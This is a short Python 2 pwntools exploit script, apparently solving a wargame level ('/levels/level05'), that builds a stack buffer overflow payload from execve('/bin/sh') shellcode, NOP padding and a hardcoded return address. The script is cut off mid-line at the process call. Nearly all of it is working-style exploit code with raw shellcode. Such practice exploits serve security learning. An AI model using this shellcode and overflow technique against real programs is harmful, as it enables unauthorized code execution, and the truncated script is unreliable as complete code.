#!/usr/bin/env python2

from pwn import *

context.log_level = 'DEBUG'
shellcode = "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh"
retaddr = p32(0xbffffb60)   # auto pack integer into little endian
payload = shellcode + (140-len(shellcode))*'\x90' + retaddr

p = process(["/levels/level05", p
